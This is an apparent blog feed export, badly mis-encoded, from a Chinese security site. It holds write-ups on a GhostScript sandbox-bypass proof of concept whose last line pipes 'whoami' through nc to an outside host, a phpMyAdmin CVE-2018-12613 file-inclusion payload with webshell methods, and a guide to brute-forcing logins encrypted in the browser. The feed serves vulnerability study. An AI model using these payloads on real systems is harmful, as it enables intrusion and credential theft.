    <summary type="html">
    
      &lt;h3 id=&quot;cmsç®€ä»‹&quot;&gt;&lt;a href=&quot;#cmsç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;cmsç®€ä»‹&quot;&gt;&lt;/a&gt;cmsç®€ä»‹&lt;/h3&gt;&lt;p&gt;Gxlcmsæ–°é—»ç³»ç»Ÿæ˜¯ä¸€ä¸ªä»¥php+mysqlè¿›è¡Œå¼€å‘çš„æ–°é—»ç±»cmså†…å®¹ç®¡ç†ç³»ç»Ÿã€‚&lt;br&gt;Gxlcmsæ–°é—»ç³»ç»Ÿçš„ä¼˜åŠ¿ï¼šå‰å°ä¸åå°é‡‡ç”¨éš”ç¦»æ–¹å¼ï¼Œæ¨¡æ¿åŒ–è®¾è®¡ï¼Œ
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="æ¼æ´æŠ«æ¼" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%8A%AB%E6%BC%8F/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="http://sunu11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="glxcms" scheme="http://sunu11.com/tags/glxcms/"/>
    
  </entry>
  
  <entry>
    <title>GhostScriptæ²™ç®±ç»•è¿‡</title>
    <link href="http://sunu11.com/2018/08/23/23/"/>
    <id>http://sunu11.com/2018/08/23/23/</id>
    <published>2018-08-23T04:41:35.000Z</published>
    <updated>2018-11-03T12:00:48.494Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png" alt="23-1"></p><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>8 æœˆ 21 å·ï¼ŒTavis Ormandy é€šè¿‡å…¬å¼€é‚®ä»¶åˆ—è¡¨ï¼Œå†æ¬¡æŒ‡å‡º ghostscript çš„å®‰å…¨æ²™ç®±å¯ä»¥è¢«ç»•è¿‡ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„å›¾ç‰‡å†…å®¹ï¼Œå¯é€ æˆå‘½ä»¤æ‰§è¡Œã€‚<a id="more"></a><br>ghostscriptåº”ç”¨å¹¿æ³›ï¼ŒImageMagickã€python-matplotlibã€libmagick ç­‰å›¾åƒå¤„ç†åº”ç”¨å‡æœ‰å¼•ç”¨ã€‚<br>åœ¨ghostscriptä¸­ç”±äºä»¥å¾€çš„å®‰å…¨äº‹ä»¶ï¼Œé’ˆå¯¹å®‰å…¨é—®é¢˜gså®˜æ–¹é‡‡ç”¨å¢åŠ å‚æ•°-dSAFERæ¥å¼€å¯å®‰å…¨æ²™ç®±ï¼Œä½†è¯¥æ²™ç®±åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ç”±LockSafetyParamsè¿™ä¸ªå€¼è¿›è¡Œæ§åˆ¶ï¼Œæ­¤æ¬¡Tavisoå‘ç°é€šè¿‡restoreæ“ä½œä¼šå°†è¯¥å€¼æˆåŠŸè¦†ç›–ï¼Œå¯¼è‡´å®‰å…¨æ²™ç®±è¢«ç»•è¿‡ï¼Œå¼•å‘å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h2 id="å¤ç°ï¼š"><a href="#å¤ç°ï¼š" class="headerlink" title="å¤ç°ï¼š"></a>å¤ç°ï¼š</h2><h3 id="æµ‹è¯•ï¼š"><a href="#æµ‹è¯•ï¼š" class="headerlink" title="æµ‹è¯•ï¼š"></a>æµ‹è¯•ï¼š</h3><p>vpså¼€å¯ç›‘å¬ç«¯å£åï¼Œå¯¹å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½è¿›è¡Œæµ‹è¯•ï¼Œä¸Šä¼ å«æœ‰æ”»å‡»æ•°æ®çš„å›¾ç‰‡ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-3.png" alt="23-3"></p><p>æœåŠ¡å™¨æ”¶åˆ°å›æ˜¾ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-4.png" alt="23-4"></p><h3 id="pocï¼š"><a href="#pocï¼š" class="headerlink" title="pocï¼š"></a>pocï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">%!PS</div><div class="line">userdict /setpagedevice undef</div><div class="line">save</div><div class="line">legal</div><div class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</div><div class="line">&#123; legal &#125; stopped &#123; pop &#125; if</div><div class="line">restore</div><div class="line">mark /OutputFile (%pipe%whoami|nc ip port) currentdevice putdeviceprops</div></pre></td></tr></table></figure><h2 id="æ¼æ´å½±å“ï¼š"><a href="#æ¼æ´å½±å“ï¼š" class="headerlink" title="æ¼æ´å½±å“ï¼š"></a>æ¼æ´å½±å“ï¼š</h2><p>version &lt;= 9.23ï¼ˆå…¨ç‰ˆæœ¬ã€å…¨å¹³å°ï¼‰<br>æ‰€æœ‰å¼•ç”¨ghostscriptçš„ä¸Šæ¸¸åº”ç”¨å¦‚ï¼š<br>imagemagick<br>libmagick<br>graphicsmagick<br>gimp<br>python-matplotlib<br>texlive-core<br>texmacs<br>latex2html<br>latex2rtf<br>ç­‰</p><h2 id="ç¼“è§£æªæ–½ï¼š"><a href="#ç¼“è§£æªæ–½ï¼š" class="headerlink" title="ç¼“è§£æªæ–½ï¼š"></a>ç¼“è§£æªæ–½ï¼š</h2><p>1ã€å¸è½½ghostscriptã€‚<br>2ã€ä½¿ç”¨ImageMagickï¼Œå»ºè®®ä¿®æ”¹policyæ–‡ä»¶ã€‚<br>ï¼ˆé»˜è®¤ä½ç½®ï¼š/etc/ImageMagick/policy.xmlï¼‰ï¼Œåœ¨ <policymap> ä¸­åŠ å…¥ä»¥ä¸‹ <policy>ï¼ˆå³ç¦ç”¨ PSã€EPSã€PDFã€XPS codersï¼‰<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-2.png" alt="23-2"> </policy></policymap></p><h2 id="å‚è€ƒä¿¡æ¯ï¼š"><a href="#å‚è€ƒä¿¡æ¯ï¼š" class="headerlink" title="å‚è€ƒä¿¡æ¯ï¼š"></a>å‚è€ƒä¿¡æ¯ï¼š</h2><p>1ã€æ¼æ´åˆ†æï¼š<br><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect</a><br>2ã€é‚®ä»¶åˆ—è¡¨ï¼š<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png&quot; alt=&quot;23-1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;8 æœˆ 21 å·ï¼ŒTavis Ormandy é€šè¿‡å…¬å¼€é‚®ä»¶åˆ—è¡¨ï¼Œå†æ¬¡æŒ‡å‡º ghostscript çš„å®‰å…¨æ²™ç®±å¯ä»¥è¢«ç»•è¿‡ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„å›¾ç‰‡å†…å®¹ï¼Œå¯é€ æˆå‘½ä»¤æ‰§è¡Œã€‚
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="å‘½ä»¤æ‰§è¡Œ" scheme="http://sunu11.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="GhostScript" scheme="http://sunu11.com/tags/GhostScript/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12613æ¼æ´å­¦ä¹ æ€»ç»“</title>
    <link href="http://sunu11.com/2018/07/25/22/"/>
    <id>http://sunu11.com/2018/07/25/22/</id>
    <published>2018-07-25T07:10:45.000Z</published>
    <updated>2018-11-03T12:03:13.090Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h3><p>åœ¨æ¼æ´æŠ«æ¼ä¹‹åï¼Œå°±å¯¹è¯¥æ¼æ´è¿›è¡Œäº†åˆ†æå¤ç°ï¼Œæœ¬æ¥æ‰“ç®—æŠ•freebufï¼Œè°çŸ¥é“è¢«æŠ¢äº†å…ˆ2333ï¼Œè´´å›¾ç•™å¿µï½ï½ï½<a id="more"></a><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-1.png" alt="22-1"></p><h4 id="CVE-2018-12613ï¼š"><a href="#CVE-2018-12613ï¼š" class="headerlink" title="CVE-2018-12613ï¼š"></a>CVE-2018-12613ï¼š</h4><p>2018å¹´6æœˆ19æ—¥ï¼ŒphpMyAdminåœ¨æœ€æ–°ç‰ˆæœ¬ä¿®å¤äº†ä¸€ä¸ªä¸¥é‡çº§åˆ«çš„æ¼æ´ã€‚æ”»å‡»è€…å¿…é¡»æ‹¥æœ‰åå°æƒé™ï¼ŒphpMyAdmin4.8.0å’Œ4.8.1å‡å—æ¼æ´å½±å“ã€‚</p><h4 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><blockquote><p>é¦–å…ˆåœ¨å¦‚ä¸‹å›¾æ‰€ç¤ºçš„index.phpä¸­å­˜åœ¨ä¸€å¤„åŒ…å«æŒ‡å®šæ–‡ä»¶çš„ä»£ç ï¼š</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-2.png" alt="22-2"></p><blockquote><p>éœ€è¦æˆåŠŸåŒ…å«ï¼Œå¿…é¡»æ»¡è¶³ifåŒºé—´ä¸­çš„äº”ä¸ªæ¡ä»¶ï¼štargetå‚æ•°å€¼ä¸ä¸ºç©ºï¼›targetå‚æ•°å€¼ä¸ºå­—ç¬¦ä¸²ï¼›targetå‚æ•°å€¼ä¸ä»¥indexå¼€å¤´ï¼›targetå‚æ•°å€¼ä¸åœ¨é»‘åå•ä¸­ï¼›è¿‡checkPageValidityå‡½æ•°çš„æ£€æŸ¥ã€‚å…¶ä¸­ç¬¬å››ä¸ªæ¡ä»¶çš„é»‘åå•å³51è¡Œä¸­import.phpä¸export.phpï¼›ç¬¬äº”ä¸ªæ¡ä»¶éœ€è¦æŸ¥çœ‹è¯¥å‡½æ•°ï¼š</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-3.png" alt="22-3"></p><blockquote><p>å¯ä»¥çœ‹åˆ°coreç±»çš„checkPageValidityå‡½æ•°ä¸­åˆå¿…é¡»ç»è¿‡ä»¥ä¸‹çš„äº”ä¸ªåˆ¤æ–­ï¼š<br>1ã€$whitelistä¸ºç©ºå°±å¼•ç”¨ç”³æ˜çš„$goto_whitelist<br>2ã€$pageå¦‚æœæ²¡æœ‰å®šä¹‰æˆ–è€…$pageä¸ä¸ºå­—ç¬¦ä¸²å°±è¿”å›false<br>3ã€$pageå¦‚æœå­˜åœ¨åœ¨$whitelistä¸­è¿”å›true<br>4ã€å¦‚æœ$_pageå­˜åœ¨åœ¨$whitelistä¸­è¿”å›true<br>5ã€ç»è¿‡urldecodeå‡½æ•°è§£ç åçš„$_pageå­˜åœ¨åœ¨$whitelistä¸­è¿”å›true<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨index.phpè°ƒç”¨checkPageValidityå‡½æ•°æ—¶æ²¡æœ‰ä¼ å…¥å…¶ä»–å‚æ•°ï¼Œå› æ­¤ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œè€Œ$goto_whitelistå¦‚ä¸‹æ‰€ç¤ºï¼š</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-4.png" alt="22-4"></p><blockquote><p>å®ƒå®šä¹‰äº†å¾ˆå¤šå¯ä»¥è¢«åŒ…å«çš„æ–‡ä»¶åã€‚ç„¶åç¬¬äºŒä¸ªåˆ¤æ–­å¯ä»¥è·³è¿‡ï¼›çœ‹ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼Œå¯ä»¥çœ‹åˆ°$pageå‚æ•°æ˜¯ä¸åœ¨$whitelistä¸­çš„ï¼Œæ­¤å¤„ä¸æ»¡è¶³ï¼›çœ‹ç¬¬å››ä¸ªåˆ¤æ–­ï¼Œè¿™ä¸ªåˆ¤æ–­æ˜¯å¯¹$_pageè¿›è¡Œçš„ï¼Œæ ¡éªŒ$_pageæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œè€Œ$_pageæ˜¯å°†$pageå€¼æœ«å°¾åŠ ä¸Šâ€™?â€™åä»å­—ç¬¦ä¸²ç¬¬0ä½å¼€å§‹åˆ†å‰²ï¼Œå–å…¶ä¸­ç¬¬ä¸€æ¬¡å‡ºç°?ä¹‹å‰çš„å†…å®¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br>target=sql.ph%3fpæ—¶ï¼š</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-5.png" alt="22-5"></p><blockquote><p>å› æ­¤æ­¤å¤„å¯ä»¥ç”¨â€™$target=db_sql.php?/../../è¢«åŒ…å«æ–‡ä»¶â€™æ¥æ»¡è¶³æ¡ä»¶ï¼Œä½†æ˜¯$targetè¿›å…¥åˆ°index.phpçš„include()ä¸­ï¼Œè¢«åŒ…å«çš„æ–‡ä»¶æ— æ³•æ‰“å¼€ï¼Œå‡ºç°æŠ¥é”™ã€‚ï¼ˆwindowsæ–‡ä»¶å‘½åè§„åˆ™ä¸­è§„å®šäº†æ–‡ä»¶åä¸èƒ½å‡ºç°ç‰¹æ®Šå­—ç¬¦ï¼Œlinuxä¸ºæœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¯ä»¥ä½¿ç”¨ï¼Ÿç›´æ¥è¿›è¡Œç»•è¿‡ï¼‰</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-6.png" alt="22-6"></p><blockquote><p>ç¬¬äº”ä¸ªåˆ¤æ–­ï¼Œå…ˆå°†$pageè¿›è¡Œurldecodeè§£ç ï¼Œç„¶åå†è¿›è¡Œï¼Ÿçš„åˆ†å‰²ï¼Œå–å€¼è¿›è¡Œåˆ¤æ–­ï¼Œåªè¦è§£ç ååˆ†å‰²å‡ºæ¥çš„å€¼åœ¨$whitelistä¸­å³å¯æ»¡è¶³æ¡ä»¶ã€‚è€Œåœ¨$target é‡Œé—®å·è¢«äºŒæ¬¡ç¼–ç ä¸º%253fï¼Œ db_sql.php%253fä¹Ÿä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªç›®å½•ï¼Œå¯ä»¥ç”¨../è·¨è¶Šï¼ŒæˆåŠŸå®ç°åŒ…å«ã€‚å› æ­¤å‘½åè§„èŒƒé‡Œé¢æ²¡æœ‰å°†%æ”¾è¿›å»ä¹Ÿæ˜¯è¯¥æ¼æ´èƒ½åœ¨windowsä¸‹æˆåŠŸåˆ©ç”¨çš„ä¸€ä¸ªå…³é”®ç‚¹ã€‚</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-7.png" alt="22-7"></p><blockquote><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å°†ï¼Ÿè¿›è¡ŒäºŒæ¬¡ç¼–ç ã€‚å¦‚æœä¼ å…¥target=db_sql.php%253fã€‚åœ¨ç¬¬å››ä¸ªåˆ¤æ–­ä¸­è¿›è¡Œç™½åå•æ ¡éªŒæ—¶ï¼Œä¸ºdb_sql.php%3fï¼Œä¸æ»¡è¶³ï¼Œç¬¬äº”ä¸ªåˆ¤æ–­çš„urldecodeåï¼Œè¿›è¡Œæ ¡éªŒæ—¶ä¸ºdb_sql.php,ç¬¦åˆæ¡ä»¶ï¼Œç„¶åå³å¯æˆåŠŸåŒ…å«æ–‡ä»¶ã€‚</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-8.png" alt="22-8"></p><h4 id="å¤ç°å¿ƒå¾—ï¼š"><a href="#å¤ç°å¿ƒå¾—ï¼š" class="headerlink" title="å¤ç°å¿ƒå¾—ï¼š"></a>å¤ç°å¿ƒå¾—ï¼š</h4><p>getshellæ–¹å¼</p><p>1ã€ä¸Šä¼ sqlæ–‡ä»¶ï¼Œç„¶åè¿›è¡ŒåŒ…å«ã€‚<br>2ã€å¼€å¯webshellæ—¥å¿—åŠŸèƒ½ï¼ŒæŸ¥è¯¢webshellè¯­å¥åï¼ŒåŒ…å«æ—¥å¿—ã€‚<br>3ã€å°†webshellå†™å…¥å­—æ®µä¸­ï¼Œå¦‚æœæ•°æ®åº“åœ¨æœ¬åœ°ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŸ¥è¯¢æ•°æ®åº“æ–‡ä»¶ä½ç½®ï¼šselect @@datadirï¼›ç„¶åå¾—åˆ°æ•°æ®åº“æ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼Œè€Œå­—æ®µå†…å®¹åˆ™åœ¨æ•°æ®åº“å/è¡¨å.frmä¸­</p><p>è¯´æ˜å›¾1ï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-9.png" alt="22-9"></p><p>è¯´æ˜å›¾2ï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-10.png" alt="22-10"></p><p>4ã€é€šè¿‡phpsessionæ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆæ‰§è¡ŒæŸ¥æ‰¾webshellçš„è¯­å¥ï¼Œç„¶ååœ¨cookieä¸­çš„phpmyadminå‚æ•°ä¸­å¯çœ‹åˆ°sessionæ–‡ä»¶åã€‚<br>è¯´æ˜å›¾1ï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-11.png" alt="22-11"></p><p>è¯´æ˜å›¾2<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-12.png" alt="22-12"></p><p>getshellæ–¹å¼ï¼š<br>        ç›®å‰å®˜æ–¹å·²ä¿®å¤æ¼æ´ï¼Œæ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬å¯ä¸å—æ­¤æ¼æ´å½±å“ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h3&gt;&lt;p&gt;åœ¨æ¼æ´æŠ«æ¼ä¹‹åï¼Œå°±å¯¹è¯¥æ¼æ´è¿›è¡Œäº†åˆ†æå¤ç°ï¼Œæœ¬æ¥æ‰“ç®—æŠ•freebufï¼Œè°çŸ¥é“è¢«æŠ¢äº†å…ˆ2333ï¼Œè´´å›¾ç•™å¿µï½ï½ï½
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="phpmyadmin" scheme="http://sunu11.com/tags/phpmyadmin/"/>
    
      <category term="æ¼æ´æ€»ç»“" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="CVE-2018-12613" scheme="http://sunu11.com/tags/CVE-2018-12613/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•å¯¹ç»å‰ç«¯åŠ å¯†åçš„æ•°æ®è¿›è¡Œçˆ†ç ´</title>
    <link href="http://sunu11.com/2018/07/23/21/"/>
    <id>http://sunu11.com/2018/07/23/21/</id>
    <published>2018-07-23T07:50:45.000Z</published>
    <updated>2018-11-03T12:03:20.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-1-ç®€è¿°ï¼š"><a href="#1-1-ç®€è¿°ï¼š" class="headerlink" title="1.1 ç®€è¿°ï¼š"></a>1.1 ç®€è¿°ï¼š</h2><p>æœ€è¿‘é‡åˆ°ä¸¤ä¸ªä¸ªæ¡ˆä¾‹ï¼Œç»è¿‡ä¸€ç•ªå€’è…¾ï¼Œå‘ç°å…¶ç™»å½•åŠŸèƒ½å‡å¯æ’åº“ã€‚ä½†æ˜¯éƒ½å­˜åœ¨ç™»å½•æ•°æ®æœ¬åœ°åŠ å¯†ï¼Œæœ‰ç©ºäº†æ”¾ä¸€èµ·æ€»ç»“è®°å½•ä¸€ä¸‹ã€‚<a id="more"></a></p><h2 id="2-1-æ¡ˆä¾‹1-RSAæœ¬åœ°åŠ å¯†"><a href="#2-1-æ¡ˆä¾‹1-RSAæœ¬åœ°åŠ å¯†" class="headerlink" title="2.1 æ¡ˆä¾‹1(RSAæœ¬åœ°åŠ å¯†):"></a>2.1 æ¡ˆä¾‹1(RSAæœ¬åœ°åŠ å¯†):</h2><h3 id="2-1-1-æ‘¸åº•ï¼š"><a href="#2-1-1-æ‘¸åº•ï¼š" class="headerlink" title="2.1.1 æ‘¸åº•ï¼š"></a>2.1.1 æ‘¸åº•ï¼š</h3><blockquote><p>é¦–å…ˆï¼Œè¿›è¡Œæ­£å¸¸ç™»å½•é€»è¾‘æµ‹è¯•ï¼Œå‘ç°è¯¥ç³»ç»Ÿç™»å½•é€»è¾‘åˆ†ä¸‹é¢ä¸¤æ­¥ï¼š<br>1ã€è¾“å…¥æ­£ç¡®ç”¨æˆ·åå¯†ç ï¼Œæ ¡éªŒæ­£ç¡®åï¼Œå‘æ³¨å†Œæ‰‹æœºå·å‘é€éªŒè¯ç ã€‚<br>2ã€è¾“å…¥æ­£ç¡®éªŒè¯ç ï¼Œç™»å½•ç³»ç»Ÿã€‚</p></blockquote><p>ä»è¯¥é€»è¾‘å¯çŸ¥æ­¤å¤„å¯é€šè¿‡å¡«å†™ç™»å½•ç”¨æˆ·åå¯†ç åæ˜¯å¦å‘é€éªŒè¯ç æ¥åˆ¤æ–­è¾“å…¥æ•°æ®æ˜¯å¦ä¸ºæ­£ç¡®ç”¨æˆ·ç™»å½•å‡­è¯ï¼Œç”±äºç«™ç‚¹æœªå¯¹è·å–éªŒè¯ç æäº¤é¢‘ç‡ä½œä»»ä½•é™åˆ¶ï¼Œä»è€Œå¯è‡ªåŠ¨åŒ–æäº¤æ¥è·å–è¯¥ç«™ç‚¹æ­£ç¡®ç”¨æˆ·åå¯†ç ã€‚</p><h3 id="2-1-2-æ¼”ä¹ ï¼š"><a href="#2-1-2-æ¼”ä¹ ï¼š" class="headerlink" title="2.1.2 æ¼”ä¹ ï¼š"></a>2.1.2 æ¼”ä¹ ï¼š</h3><blockquote><p>åœ¨googleçš„è¿‡ç¨‹ä¸­ï¼Œå¾ˆå¿«çš„æ‰¾åˆ°äº†ä¸€æ¬¾burpsuiteå¥—ä»¶ï¼šjsEncrypterï¼ˆæ„Ÿè°¢ä½œè€…æä¾›è¿™ä¹ˆåˆ©ç´¢çš„æ’ä»¶ï¼‰ã€‚ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/c0ny1/jsEncrypter/releasesã€‚" target="_blank" rel="external">https://github.com/c0ny1/jsEncrypter/releasesã€‚</a><br>å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å°†jsencrypt.min.jsä¸‹è½½è‡³æœ¬åœ°ã€‚ç„¶åå¯¹ç«™ç‚¹ç³»ç»Ÿå‰ç«¯ä»£ç è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‰ç«¯å¤„ç†è¿‡ç¨‹ï¼Œç¼–å†™jsæ¨¡æ¿æ–‡ä»¶ã€‚</p></blockquote><p>å¯¹ç™»å½•è¿‡ç¨‹è¿›è¡Œè°ƒè¯•ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-1.png" alt="21-1"></p><blockquote><p>åœ¨å®¡è®¡å‰ç«¯æºä»£ç é¡µé¢ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°ï¼Œåœ¨uiç›®å½•ä¸‹çš„libæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªsecurityæ–‡ä»¶å¤¹ï¼Œè€Œå…¶ä¸­çš„rsa_util.jså°±æ˜¯è°ƒç”¨jsencrypt.min.jsæ–‡ä»¶ç§çš„JSEncryptæ–¹æ³•å¯¹ç”¨æˆ·åå¯†ç è¿›è¡ŒåŠ å¯†ã€‚</p></blockquote><p>ä¸‹å›¾ä¸ºåŠ¨æ€è°ƒè¯•ç»“æœï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-2.png" alt="21-2"></p><blockquote><p>æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçœ‹åˆ°åŠ å¯†è¿‡ç¨‹ï¼Œç„¶åæ ¹æ®jsEncrypterçš„readmeæ–‡æ¡£ä¸­çš„ä½¿ç”¨æŒ‡å—ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å…¶è°ƒç”¨é€»è¾‘ï¼Œè‡ªè¡Œç¼–å†™ä¸€ä¸ªjsEncrypter_rsa.jsæ–‡ä»¶ï¼Œæ¥è°ƒç”¨jsencrypt.min.jsæ–‡ä»¶ä¸ºæˆ‘ä»¬çš„æ˜æ–‡æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚</p></blockquote><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå°å‘ï¼š</p><blockquote><p>1ã€ç”±åŠ¨æ€è°ƒè¯•å¯çŸ¥ï¼Œå…¬é’¥_pubkåœ¨cookieä¸­ä»¥urlç¼–ç åçš„æ–¹å¼å­˜å‚¨ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬æœ¬åœ°è°ƒç”¨ï¼Œéœ€è¦è§£ç ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œï¼Œå¯¹äºæ¢è¡Œç¬¦ï¼Œéœ€è¦ç”¨\næ›¿æ¢ã€‚<br>2ã€ç”±äºjsEncrypteræ’ä»¶ä½¿ç”¨äº†phantomjså¹³å°ï¼Œè€Œphantomjsæ”¯æŒurlè§£ç çš„å‡½æ•°ä¸ºencodeURIComponentã€‚å› æ­¤ä¸èƒ½ä½¿ç”¨ä¸ç³»ç»Ÿå‰ç«¯ä¸€è‡´çš„encodeURIå‡½æ•°ã€‚</p></blockquote><p>ç„¶åä»¿å†™ç³»ç»ŸåŠ å¯†çš„æ–¹å¼ï¼Œå°†å…¬é’¥ä»¥åŠè°ƒç”¨é€»è¾‘å†™å…¥åˆ°æˆ‘ä»¬è‡ªå·±çš„jsæ–‡ä»¶ä¸­ï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-3.png" alt="21-3"></p><h3 id="2-1-3-æ”»å‡»ï¼š"><a href="#2-1-3-æ”»å‡»ï¼š" class="headerlink" title="2.1.3 æ”»å‡»ï¼š"></a>2.1.3 æ”»å‡»ï¼š</h3><p>1ã€è¿è¡ŒphantomJSå¹¶æµ‹è¯•</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-4.png" alt="21-4"></p><p>2ã€BurpsuiteéªŒè¯ï¼Œè°ƒç”¨æˆåŠŸï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-5.png" alt="21-5"></p><p>3ã€æŠ“åŒ…ï¼ŒåŠ è½½å­—å…¸ï¼Œå®æ–½çˆ†ç ´ï¼šï¼ˆä¸¤ä¸ªå‚æ•°çš„å­—å…¸éƒ½ä½¿ç”¨æ’ä»¶ï¼‰</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-6.png" alt="21-6"></p><p>ç„¶åï¼ŒæˆåŠŸçˆ†ç ´:</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-7.png" alt="21-7"></p><h2 id="2-2-æ¡ˆä¾‹2-md5æœ¬åœ°åŠ å¯†"><a href="#2-2-æ¡ˆä¾‹2-md5æœ¬åœ°åŠ å¯†" class="headerlink" title="2.2 æ¡ˆä¾‹2(md5æœ¬åœ°åŠ å¯†):"></a>2.2 æ¡ˆä¾‹2(md5æœ¬åœ°åŠ å¯†):</h2><h3 id="2-2-1-æ‘¸åº•ï¼š"><a href="#2-2-1-æ‘¸åº•ï¼š" class="headerlink" title="2.2.1 æ‘¸åº•ï¼š"></a>2.2.1 æ‘¸åº•ï¼š</h3><blockquote><p>é¦–å…ˆé€šè¿‡åˆ†æç”¨æˆ·ç™»å½•è¿‡ç¨‹ï¼Œå‘ç°è¯¥ç«™ç‚¹ç™»å½•æ— éªŒè¯ç 